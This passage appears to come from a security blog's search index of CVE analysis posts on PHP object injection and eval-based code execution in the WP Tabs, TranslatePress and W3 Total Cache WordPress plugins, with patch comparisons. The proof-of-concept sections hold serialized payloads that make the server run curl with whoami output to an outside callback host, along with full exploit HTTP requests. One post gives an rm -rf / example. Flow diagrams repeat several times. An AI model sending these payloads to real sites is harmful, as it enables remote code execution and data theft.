Then import( $shortcodes ) is called with $shortcodes as $data['shortcode']. Current JSON upload structure: public function import( $shortcodes ) { $errors = array(); foreach ( $shortcodes as $index =\u003e $shortcode ) { $errors[ $index ] = array(); $new_tabs_id = 0; try { ... if ( isset( $shortcode['meta'] ) \u0026\u0026 is_array( $shortcode['meta'] ) ) { foreach ( $shortcode['meta'] as $key =\u003e $value ) { if ( 'sp_tab_source_options' === $key || 'sp_tab_shortcode_options' === $key ) { $sanitize_value = $this-\u003esanitize_and_collect_metabox_data( $key, maybe_unserialize( str_replace( '{#ID#}', $new_tabs_id, $value ) ) ); update_post_meta( $new_tabs_id, $key, $sanitize_value ); } } } } catch ( Exception $e ) { array_push( $errors[ $index ], $e-\u003egetMessage() ); // If there was a failure somewhere, clean up. wp_trash_post( $new_tabs_id ); } ... } $errors = reset( $errors ); return isset( $errors[0] ) ? new WP_Error( 'import_tabs_error', $errors[0] ) : $shortcodes; } The function loops through shortcodes and checks if shortcode['meta'] exists as an array; if so, it iterates over $shortcode['meta']. $sanitize_value = $this-\u003esanitize_and_collect_metabox_data( $key, maybe_unserialize( str_replace( '{#ID#}', $new_tabs_id, $value ) ) ); If the key is sp_tab_source_options or sp_tab_shortcode_options: Replace {#ID#} in the value with $new_tabs_id Call maybe_unserialize() to decode serialized data Call sanitize_and_collect_metabox_data() to sanitize and normalize data Finally, store the sanitized value using update_post_meta() for post ID $new_tabs_id Thus, the JSON structure to upload is: ","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Administrator uploads JSON via /wp-admin/admin-ajax.php?action=tabs_import_shortcode\"] --\u003e B[\"import_shortcode() invoked\"]\rB --\u003e C{\"Check nonce: wp_verify_nonce()\"}\rC --\u003e|Fail| X[\"Stop \u0026 return error: Nonce verification failed\"]\rC --\u003e|Pass| D[\"json_decode() twice → extract $shortcodes\"]\rD --\u003e|Empty/Invalid| Y[\"Stop \u0026 return error: Nothing to import\"]\rD --\u003e|Valid| E[\"Call import($shortcodes)\"]\rE --\u003e F[\"Loop through each shortcode\"]\rF --\u003e H{\"Has 'meta' and is array?\"}\rH --\u003e|No| Z[\"Skip entry\"]\rH --\u003e|Yes| I[\"Loop each meta field\"]\rI --\u003e J{\"Key == 'sp_tab_source_options' OR 'sp_tab_shortcode_options'?\"}\rJ --\u003e|No| Z\rJ --\u003e|Yes| K[\"Replace {#ID#} with new ID\"]\rK --\u003e L[\"maybe_unserialize() ← Vulnerable\"]\rL --\u003e M{\"Does unserialize create object?\"}\rM --\u003e|Yes| R[\"Object Injection → Possible RCE if malicious class exists\"]\rM --\u003e|No| S[\"Sanitize + update_post_meta() and continue\"]\rgraph TD\rA[\"Administrator uploads JSON via /wp-admin/admin-ajax.php?action=tabs_import_shortcode\"] --\u003e B[\"import_shortcode() invoked\"]\rB --\u003e C{\"Check nonce: wp_verify_nonce()\"}\rC --\u003e|Fail| X[\"Stop \u0026 return error: Nonce verification failed\"]\rC --\u003e|Pass| D[\"json_decode() twice → extract $shortcodes\"]\rD --\u003e|Empty/Invalid| Y[\"Stop \u0026 return error: Nothing to import\"]\rD --\u003e|Valid| E[\"Call import($shortcodes)\"]\rE --\u003e F[\"Loop through each shortcode\"]\rF --\u003e H{\"Has 'meta' and is array?\"}\rH --\u003e|No| Z[\"Skip entry\"]\rH --\u003e|Yes| I[\"Loop each meta field\"]\rI --\u003e J{\"Key == 'sp_tab_source_options' OR 'sp_tab_shortcode_options'?\"}\rJ --\u003e|No| Z\rJ --\u003e|Yes| K[\"Replace {#ID#} with new ID\"]\rK --\u003e L[\"maybe_unserialize() ← Vulnerable\"]\rL --\u003e M{\"Does unserialize create object?\"}\rM --\u003e|Yes| R[\"Object Injection → Possible RCE if malicious class exists\"]\rM --\u003e|No| S[\"Sanitize + update_post_meta() and continue\"]\rgraph TD\rA[\"Administrator uploads JSON via /wp-admin/admin-ajax.php?action=tabs_import_shortcode\"] --\u003e B[\"import_shortcode() invoked\"]\rB --\u003e C{\"Check nonce: wp_verify_nonce()\"}\rC --\u003e|Fail| X[\"Stop \u0026 return error: Nonce verification failed\"]\rC --\u003e|Pass| D[\"json_decode() twice → extract $shortcodes\"]\rD --\u003e|Empty/Invalid| Y[\"Stop \u0026 return error: Nothing to import\"]\rD --\u003e|Valid| E[\"Call import($shortcodes)\"]\rE --\u003e F[\"Loop through each shortcode\"]\rF --\u003e H{\"Has 'meta' and is array?\"}\rH --\u003e|No| Z[\"Skip entry\"]\rH --\u003e|Yes| I[\"Loop each meta field\"]\rI --\u003e J{\"Key == 'sp_tab_source_options' OR 'sp_tab_shortcode_options'?\"}\rJ --\u003e|No| Z\rJ --\u003e|Yes| K[\"Replace {#ID#} with new ID\"]\rK --\u003e L[\"maybe_unserialize() ← Vulnerable\"]\rL --\u003e M{\"Does unserialize create object?\"}\rM --\u003e|Yes| R[\"Object Injection → Possible RCE if malicious class exists\"]\rM --\u003e|No| S[\"Sanitize + update_post_meta() and continue\"]\rgraph TD\rA[\"Administrator uploads JSON via /wp-admin/admin-ajax.php?action=tabs_import_shortcode\"] --\u003e B[\"import_shortcode() invoked\"]\rB --\u003e C{\"Check nonce: wp_verify_nonce()\"}\rC --\u003e|Fail| X[\"Stop \u0026 return error: Nonce verification failed\"]\rC --\u003e|Pass| D[\"json_decode() twice → extract $shortcodes\"]\rD --\u003e|Empty/Invalid| Y[\"Stop \u0026 return error: Nothing to import\"]\rD --\u003e|Valid| E[\"Call import($shortcodes)\"]\rE --\u003e F[\"Loop through each shortcode\"]\rF --\u003e H{\"Has 'meta' and is array?\"}\rH --\u003e|No| Z[\"Skip entry\"]\rH --\u003e|Yes| I[\"Loop each meta field\"]\rI --\u003e J{\"Key == 'sp_tab_source_options' OR 'sp_tab_shortcode_options'?\"}\rJ --\u003e|No| Z\rJ --\u003e|Yes| K[\"Replace {#ID#} with new ID\"]\rK --\u003e L[\"maybe_unserialize() ← Vulnerable\"]\rL --\u003e M{\"Does unserialize create object?\"}\rM --\u003e|Yes| R[\"Object Injection → Possible RCE if malicious class exists\"]\rM --\u003e|No| S[\"Sanitize + update_post_meta() and continue\"]\r","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rCreate a test class in wp-config.php: class Evil { public $command = \"ls /\"; public function __destruct() { die(system($this-\u003ecommand)); } } Import JSON file: { \"shortcode\": { \"shortcode1\": { \"meta\": { \"sp_tab_source_options\": \"O:4:\\\"Evil\\\":1:{s:7:\\\"command\\\";s:75:\\\"curl http://m7uzxda0q6dtl9sp5pvah7vuilocc30s.oastify.com/?leadked=$(whoami)\\\";}\" } } } } POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: administrator_cookie ... shortcode=%22%7B%5Cr%5Cn++%5C%22shortcode%5C%22%3A+%7B%5Cr%5Cn++++%5C%22shortcode1%5C%22%3A+%7B%5Cr%5Cn++++++%5C%22meta%5C%22%3A+%7B%5Cr%5Cn++++++++%5C%22sp_tab_source_options%5C%22%3A+%5C%22O%3A4%3A%5C%5C%5C%22Evil%5C%5C%5C%22%3A1%3A%7Bs%3A7%3A%5C%5C%5C%22command%5C%5C%5C%22%3Bs%3A75%3A%5C%5C%5C%22curl+http%3A%2F%2Fm7uzxda0q6dtl9sp5pvah7vuilocc30s.oastify.com%2F%3Fleadked%3D%24(whoami)%5C%5C%5C%22%3B%7D%5C%22%5Cr%5Cn++++++%7D%5Cr%5Cn++++%7D%5Cr%5Cn++%7D%5Cr%5Cn%7D%22\u0026action=tabs_import_shortcode\u0026nonce=b6d5e5977d\u0026unSanitize= Result\r","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE-2025-48134 originates from insecure deserialization through maybe_unserialize() during import, allowing PHP Object Injection and possible RCE if a malicious class exists. Even though Administrator privileges and a valid nonce are required, the impact is still critical. Version 2.2.13 fixes this by preventing arbitrary object creation during unserialization. ","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rRoot cause: uncontrolled deserialization of input Impact: Object Injection and Remote Code Execution Administrator privileges required for exploitation Never unserialize user input without restricting classes or applying safe validation ","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress WP Tabs Plugin \u003c= 2.2.12 is vulnerable to PHP Object Injection ","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress TranslatePress Plugin.","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe vulnerability is a Deserialization of Untrusted Data issue in Cozmoslabs TranslatePress, which allows for Object Injection. This issue affects TranslatePress from n/a up to version 2.9.6. CVE ID: CVE-2025-30773 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 2.9.6 Patched Versions: 2.9.7 CVSS severity: High (7.2) Required Privilege: Administrator Product: WordPress TranslatePress Plugin ","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – TranslatePress: 2.9.6 – vulnerable 2.9.7 – patched Diff Tool (diff) → Meld or any other diff tool. ","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rIn the vulnerable version (v2.9.6): public function trp_update_database(){ if ( ! current_user_can( apply_filters('trp_update_database_capability', 'manage_options') ) ){ $this-\u003estop_and_print_error( __('Update aborted! Your user account doesn\\'t have the capability to perform database updates.', 'translatepress-multilingual' ) ); } $nonce = isset( $_REQUEST['trp_updb_nonce'] ) ? wp_verify_nonce( sanitize_text_field( $_REQUEST['trp_updb_nonce'] ), 'tpupdatedatabase' ) : false; if ( $nonce === false ){ $this-\u003estop_and_print_error( __('Update aborted! Invalid nonce.', 'translatepress-multilingual' ) ); } ... $extra_params = isset( $_REQUEST['trp_updb_extra_params'] ) ? unserialize(base64_decode(sanitize_text_field($_REQUEST['trp_updb_extra_params'] ))) : array(); ... } Here, unserialize() is called directly on user-supplied data ($_REQUEST['trp_updb_extra_params'] after HTML sanitization and Base64 decode). This creates a serious vulnerability: Object Injection risk: If an attacker provides a PHP object payload encoded in Base64, the decode + unserialize process can initialize a malicious object, leading to Object Injection and potentially Remote Code Execution (RCE). No safety validation: There is no data validation prior to calling unserialize(). No fallback mechanism: If data is invalid or malicious, the system lacks graceful handling, increasing risk. Patch (v2.9.7): Patch changes\runserialize() is replaced with json_decode(): By removing unserialize(), the vulnerability surface is eliminated entirely. ","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rThe trp_update_database() function checks whether the current user is an Administrator via: if ( ! current_user_can( apply_filters('trp_update_database_capability', 'manage_options') ) ){ $this-\u003estop_and_print_error( __('Update aborted! Your user account doesn\\'t have the capability to perform database updates.', 'translatepress-multilingual' ) ); } It also verifies a nonce to prevent CSRF: $nonce = isset( $_REQUEST['trp_updb_nonce'] ) ? wp_verify_nonce( sanitize_text_field( $_REQUEST['trp_updb_nonce'] ), 'tpupdatedatabase' ) : false; if ( $nonce === false ){ $this-\u003estop_and_print_error( __('Update aborted! Invalid nonce.', 'translatepress-multilingual' ) ); } If nonce is missing, the vulnerability can be exploited unauthenticated by tricking an admin into visiting an attacker-controlled page. The browser will send the request with admin cookies, manage_options will pass, and backend logic proceeds. Searching for the trp_update_database function: Search result for trp_update_database\rtrp_update_database is assigned to the page parameter, meaning it is the callback invoked when visiting /wp-admin/admin.php?page=trp_update_database. ","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Administrator visits /wp-admin/admin.php?page=trp_update_database\"] --\u003e B[\"trp_update_database() invoked\"]\rB --\u003e C{\"Check capability: current_user_can(manage_options)\"}\rC --\u003e|Fail| X[\"Stop \u0026 print error: insufficient privilege\"]\rC --\u003e|Pass| D[\"Verify nonce: wp_verify_nonce()\"]\rD --\u003e|Fail| Y[\"Stop \u0026 print error: Invalid nonce\"]\rD --\u003e|Pass| E[\"Read trp_updb_extra_params\"]\rE --\u003e F[\"base64_decode()\"]\rF --\u003e G[\"unserialize()\"]\rG --\u003e H{\"Is payload malicious?\"}\rH --\u003e|Yes| R[\"Object Injection → Code Execution (RCE)\"]\rH --\u003e|No| S[\"Continue update process normally\"]\rgraph TD\rA[\"Administrator visits /wp-admin/admin.php?page=trp_update_database\"] --\u003e B[\"trp_update_database() invoked\"]\rB --\u003e C{\"Check capability: current_user_can(manage_options)\"}\rC --\u003e|Fail| X[\"Stop \u0026 print error: insufficient privilege\"]\rC --\u003e|Pass| D[\"Verify nonce: wp_verify_nonce()\"]\rD --\u003e|Fail| Y[\"Stop \u0026 print error: Invalid nonce\"]\rD --\u003e|Pass| E[\"Read trp_updb_extra_params\"]\rE --\u003e F[\"base64_decode()\"]\rF --\u003e G[\"unserialize()\"]\rG --\u003e H{\"Is payload malicious?\"}\rH --\u003e|Yes| R[\"Object Injection → Code Execution (RCE)\"]\rH --\u003e|No| S[\"Continue update process normally\"]\rgraph TD\rA[\"Administrator visits /wp-admin/admin.php?page=trp_update_database\"] --\u003e B[\"trp_update_database() invoked\"]\rB --\u003e C{\"Check capability: current_user_can(manage_options)\"}\rC --\u003e|Fail| X[\"Stop \u0026 print error: insufficient privilege\"]\rC --\u003e|Pass| D[\"Verify nonce: wp_verify_nonce()\"]\rD --\u003e|Fail| Y[\"Stop \u0026 print error: Invalid nonce\"]\rD --\u003e|Pass| E[\"Read trp_updb_extra_params\"]\rE --\u003e F[\"base64_decode()\"]\rF --\u003e G[\"unserialize()\"]\rG --\u003e H{\"Is payload malicious?\"}\rH --\u003e|Yes| R[\"Object Injection → Code Execution (RCE)\"]\rH --\u003e|No| S[\"Continue update process normally\"]\rgraph TD\rA[\"Administrator visits /wp-admin/admin.php?page=trp_update_database\"] --\u003e B[\"trp_update_database() invoked\"]\rB --\u003e C{\"Check capability: current_user_can(manage_options)\"}\rC --\u003e|Fail| X[\"Stop \u0026 print error: insufficient privilege\"]\rC --\u003e|Pass| D[\"Verify nonce: wp_verify_nonce()\"]\rD --\u003e|Fail| Y[\"Stop \u0026 print error: Invalid nonce\"]\rD --\u003e|Pass| E[\"Read trp_updb_extra_params\"]\rE --\u003e F[\"base64_decode()\"]\rF --\u003e G[\"unserialize()\"]\rG --\u003e H{\"Is payload malicious?\"}\rH --\u003e|Yes| R[\"Object Injection → Code Execution (RCE)\"]\rH --\u003e|No| S[\"Continue update process normally\"]\r","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rCreate test class in wp-config.php class Evil { public $command = \"ls /\"; public function __destruct() { die(system($this-\u003ecommand)); } } Send request through BurpSuite proxy Resend the request with trp_updb_extra_params containing a serialized Base64-encoded payload trp_updb_extra_params = base64_encode('O:4:\"Evil\":1:{s:7:\"command\";s:75:\"curl http://p8ye6bo0snakjfntwfcv7zvcz35utkh9.oastify.com/?leadked=$(whoami)\";}') POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: administrator_cookie ... action=trp_update_database\u0026trp_updb_nonce=808dff22f9\u0026initiate_update=true\u0026trp_updb_extra_params=Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NzU6ImN1cmwgaHR0cDovL3A4eWU2Ym8wc25ha2pmbnR3ZmN2N3p2Y3ozNXV0a2g5Lm9hc3RpZnkuY29tLz9sZWFka2VkPSQod2hvYW1pKSI7fQ== Output\r","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe vulnerability originates from directly using unserialize() on user-controlled input without additional validation, enabling arbitrary object instantiation and potential remote code execution if a crafted payload is supplied. Combined with CSRF, an attacker could trick an admin into executing the payload silently. Switching to json_decode() in version 2.9.7 removes the attack surface entirely and properly resolves the issue. ","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\runserialize() on untrusted input always carries Object Injection and RCE risks. User input must be validated and sanitized before processing. CSRF can escalate an “authenticated exploit” into a “silent exploitation” scenario. json_decode() is a safer choice for structured data exchange. Comparing code differences between vulnerable and patched versions helps quickly identify root causes and solutions. ","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress TranslatePress Plugin \u003c= 2.9.6 is vulnerable to PHP Object Injection ","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress W3 Total Cache Plugin.","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe WordPress W3 Total Cache plugin prior to version 2.8.13 has a command injection vulnerability via the _parse_dynamic_mfunc function, allowing unauthenticated users to execute PHP commands by submitting a comment with a malicious payload. CVE ID: CVE-2025-9501 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 2.8.12 Patched Versions: 2.8.13 CVSS severity: High (9) Required Privilege: Unauthenticated Product: WordPress W3 Total Cache Plugin ","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - W3 Total Cache: 2.8.12 – vulnerable 2.8.13 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/:2:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rThe vulnerability originates from the _parse_dynamic_mfunc function: public function _parse_dynamic_mfunc( $matches ) { $code1 = trim( $matches[1] ); $code2 = trim( $matches[2] ); $code = ( $code1 ? $code1 : $code2 ); if ( $code ) { $code = trim( $code, ';' ) . ';'; try { ob_start(); $result = eval( $code ); $output = ob_get_contents(); ob_end_clean(); } catch ( \\Exception $ex ) { $result = false; } if ( false === $result ) { $output = sprintf( 'Unable to execute code: %s', htmlspecialchars( $code ) ); } } else { $output = htmlspecialchars( 'Invalid mfunc tag syntax. The correct format is: \u003c!-- W3TC_DYNAMIC_SECURITY mfunc PHP code --\u003e\u003c!-- /mfunc W3TC_DYNAMIC_SECURITY --\u003e or \u003c!-- W3TC_DYNAMIC_SECURITY mfunc --\u003ePHP code\u003c!-- /mfunc W3TC_DYNAMIC_SECURITY --\u003e.' ); } return $output; } The eval() function at line 11 is very dangerous as it executes a string as PHP code. Example: $command = 'system(\"rm -rf /\")'; eval($command); ","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/:3:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rWhen the plugin is installed and activated, it adds to the top of wp-config.php: \u003c?php /** Enable W3 Total Cache */ define('WP_CACHE', true); // Added by W3 Total Cache ... This registers caching for WordPress. WP_CACHE is used in wp-settings.php: if ( WP_CACHE \u0026\u0026 apply_filters( 'enable_loading_advanced_cache_dropin', true ) \u0026\u0026 file_exists( WP_CONTENT_DIR . '/advanced-cache.php' ) ) { include WP_CONTENT_DIR . '/advanced-cache.php'; if ( $wp_filter ) { $wp_filter = WP_Hook::build_preinitialized_hooks( $wp_filter ); } } WordPress automatically loads advanced-cache.php if it exists. When activated, the plugin creates this file: \u003c?php defined( 'ABSPATH' ) || die(); global $w3tc_start_microtime; $w3tc_start_microtime = microtime( true ); if ( defined( 'WP_INSTALLING' ) \u0026\u0026 WP_INSTALLING ) return; if ( ! defined( 'W3TC_IN_MINIFY' ) ) { if ( ! defined( 'W3TC_DIR' ) ) { define( 'W3TC_DIR', ( defined( 'WP_PLUGIN_DIR' ) ? WP_PLUGIN_DIR : WP_CONTENT_DIR . '/plugins' ) . '/w3-total-cache' ); } if ( ! @is_dir( W3TC_DIR ) || ! file_exists( W3TC_DIR . '/w3-total-cache-api.php' ) ) { if ( defined( 'WP_ADMIN' ) ) { printf( '\u003cstrong\u003eW3 Total Cache Error:\u003c/strong\u003e some files appear to be missing or out of place. Please re-install plugin or remove \u003cstrong\u003e%s\u003c/strong\u003e. \u003cbr /\u003e', __FILE__ ); } } else { require_once W3TC_DIR . '/w3-total-cache-api.php'; if ( class_exists( '\\W3TC\\Dispatcher' ) ) { $w3tc_redirect = \\W3TC\\Dispatcher::component( 'Mobile_Redirect' ); $w3tc_redirect-\u003eprocess(); $w3tc_config = \\W3TC\\Dispatcher::config(); if ( $w3tc_config-\u003eget_boolean( 'pgcache.enabled' ) ) { $o = \\W3TC\\Dispatcher::component( 'PgCache_ContentGrabber' ); $o-\u003eprocess(); } } } } When page cache (pgcache) is enabled, $o-\u003eprocess() handles page cache logic. Enable page cache\rIn process(), the plugin prepares a mechanism to intercept page content before sending it to the browser: public function process() { $this-\u003erun_extensions_dropin(); ... Util_Bus::add_ob_callback( 'pagecache', array( $this, 'ob_callback' ) ); } This registers a callback: Util_Bus::add_ob_callback( 'pagecache', array( $this, 'ob_callback' ) ); Meaning: Plugin registers a callback named pagecache. The callback is the ob_callback method of the current object. This is executed after WordPress generates the full HTML, allowing the plugin to process it (optimize, compress, cache) before sending it to the client. add_ob_callback() simply stores the callback: public static function add_ob_callback( $key, $callback ) { $GLOBALS['_w3tc_ob_callbacks'][ $key ] = $callback; } ob_callback() is triggered when the output buffer is flushed, checking for dynamic content: public function ob_callback( $buffer ) { ... $has_dynamic = $this-\u003e_has_dynamic( $buffer ); ... if ( $has_dynamic ) { $this-\u003e_shutdown_buffer = $buffer; $buffer = ''; register_shutdown_function(array($this, 'shutdown')); } return $buffer; } $buffer contains the full HTML WordPress generated. _has_dynamic() checks for non-cacheable sections: public function _has_dynamic( $buffer ) { if ( ! defined( 'W3TC_DYNAMIC_SECURITY' ) ) return false; return preg_match( '~\u003c!--\\s*m(func|clude)\\s*' . W3TC_DYNAMIC_SECURITY . '(.*)--\u003e(.*)\u003c!--\\s*/m(func|clude)\\s*' . W3TC_DYNAMIC_SECURITY . '\\s*--\u003e~Uis', $buffer ); } Dynamic content format: \u003c!-- mfunc{W3TC_DYNAMIC_SECURITY_VALUE} --\u003e PHP code \u003c!-- /mfunc{W3TC_DYNAMIC_SECURITY_VALUE} --\u003e or \u003c!-- mclude{W3TC_DYNAMIC_SECURITY_VALUE} --\u003e PHP code \u003c!-- /mclude{W3TC_DYNAMIC_SECURITY_VALUE} --\u003e If no dynamic content → return buffer directly to cache. If dynamic content: Save full HTML to _shutdown_buffer Return empty string temporarily Register shutdown() to process after PHP request finishes public function shutdown() { $compression = $this-\u003e_page_key_extension['compression']; $buffer = $this-\u003e_parse_dynamic( $this-\u003e_shutdown_buffer ); $compressed_buffer = $this-\u003e_compress( $buffer, $compression ); echo $compressed_buffer; } shutdown() calls _parse_dynamic() to process dynamic HTML blocks and replace them wit","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/:4:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"User requests any front‑end page (unauthenticated)\"]\r--\u003e B[\"WordPress loads wp-settings.php\"]\rB --\u003e C[\"WP_CACHE = true → Load advanced-cache.php\"]\rC --\u003e D[\"advanced-cache.php runs Dispatcher\"]\rD --\u003e E[\"PgCache_ContentGrabber-\u003eprocess()\"]\rE --\u003e F[\"Util_Bus::add_ob_callback('pagecache', 'ob_callback')\"]\rF --\u003e G[\"WordPress renders full HTML into output buffer\"]\rG --\u003e H[\"ob_callback($buffer) triggered\"]\rH --\u003e I{\"_has_dynamic($buffer) ?\"}\rI --\u003e|No| J[\"Return buffer as-is → Serve cached page\"]\rI --\u003e|Yes| K[\"Save buffer to _shutdown_buffer\"]\rK --\u003e L[\"register_shutdown_function(shutdown)\"]\rL --\u003e M[\"After request completes → shutdown()\"]\rM --\u003e N[\"_parse_dynamic(_shutdown_buffer)\"]\rN --\u003e O{\"HTML contains ?\"}\rO --\u003e|Yes| P[\"_parse_dynamic_mfunc()\"]\rP --\u003e Q[\"Extract payload from comment and run eval()\"]\rO --\u003e|Or mclude| R[\"_parse_dynamic_mclude() (include type)\"]\rQ --\u003e S[\"Output replaced with execution result\"]\rR --\u003e S\rS --\u003e T[\"Page optionally compressed\"]\rT --\u003e U[\"echo back to user\"]\rgraph TD\rA[\"User requests any front‑end page (unauthenticated)\"]\r--\u003e B[\"WordPress loads wp-settings.php\"]\rB --\u003e C[\"WP_CACHE = true → Load advanced-cache.php\"]\rC --\u003e D[\"advanced-cache.php runs Dispatcher\"]\rD --\u003e E[\"PgCache_ContentGrabber-\u003eprocess()\"]\rE --\u003e F[\"Util_Bus::add_ob_callback('pagecache', 'ob_callback')\"]\rF --\u003e G[\"WordPress renders full HTML into output buffer\"]\rG --\u003e H[\"ob_callback($buffer) triggered\"]\rH --\u003e I{\"_has_dynamic($buffer) ?\"}\rI --\u003e|No| J[\"Return buffer as-is → Serve cached page\"]\rI --\u003e|Yes| K[\"Save buffer to _shutdown_buffer\"]\rK --\u003e L[\"register_shutdown_function(shutdown)\"]\rL --\u003e M[\"After request completes → shutdown()\"]\rM --\u003e N[\"_parse_dynamic(_shutdown_buffer)\"]\rN --\u003e O{\"HTML contains ?\"}\rO --\u003e|Yes| P[\"_parse_dynamic_mfunc()\"]\rP --\u003e Q[\"Extract payload from comment and run eval()\"]\rO --\u003e|Or mclude| R[\"_parse_dynamic_mclude() (include type)\"]\rQ --\u003e S[\"Output replaced with execution result\"]\rR --\u003e S\rS --\u003e T[\"Page optionally compressed\"]\rT --\u003e U[\"echo back to user\"]\rgraph TD\rA[\"User requests any front‑end page (unauthenticated)\"]\r--\u003e B[\"WordPress loads wp-settings.php\"]\rB --\u003e C[\"WP_CACHE = true → Load advanced-cache.php\"]\rC --\u003e D[\"advanced-cache.php runs Dispatcher\"]\rD --\u003e E[\"PgCache_ContentGrabber-\u003eprocess()\"]\rE 